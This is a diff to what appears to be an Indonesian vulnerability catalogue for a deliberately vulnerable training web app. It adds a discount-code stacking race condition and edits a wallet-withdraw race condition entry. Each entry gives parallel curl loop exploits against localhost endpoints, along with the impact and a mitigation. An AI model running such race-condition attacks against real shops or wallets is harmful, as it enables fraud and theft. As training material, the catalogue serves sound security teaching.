@@ -178,7 +178,7 @@ TOOLS YANG DIREKOMENDASIKAN:
      dampak:         Beli barang gratis
      mitigasi:       Hitung harga di server dari database, jangan percaya client
 
-[20] Race Condition (Infinite Money)
+[20] Race Condition (Wallet Withdraw)
      apa yang salah: Balance check dan update tanpa transaction lock
      endpoint:       POST /api/wallet/withdraw
      exploit:        # Kirim 20+ request parallel:
@@ -188,8 +188,22 @@ TOOLS YANG DIREKOMENDASIKAN:
                          -H "Content-Type: application/json" \
                          -d '{"amount":100}' &
                      done
-     dampak:         Withdraw lebih dari saldo (saldo jadi negatif)
+     dampak:         Withdraw lebih dari saldo
      mitigasi:       SELECT ... FOR UPDATE, atau atomic UPDATE
+
+[20b] Race Condition (Discount Code Stacking)
+     apa yang salah: Check-then-insert tanpa transaction, delay 500ms
+     endpoint:       POST /api/discount/apply
+     discount code:  IDN20 (20% off, ditampilkan di Admin Dashboard)
+     exploit:        # Kirim 5 request parallel → 5x 20% = 100% free!
+                     for i in $(seq 1 5); do
+                       curl -X POST http://localhost:3001/api/discount/apply \
+                         -H "Authorization: Bearer <token>" \
+                         -H "Content-Type: application/json" \
+                         -d '{"code":"IDN20","product_id":1}' &
+                     done
+     dampak:         Diskon bisa di-stack sampai 100% → beli gratis
+     mitigasi:       UNIQUE constraint, SELECT ... FOR UPDATE, atomic insert
 
 [21] Unrestricted File Upload
      apa yang salah: Tidak ada validasi file extension/MIME type
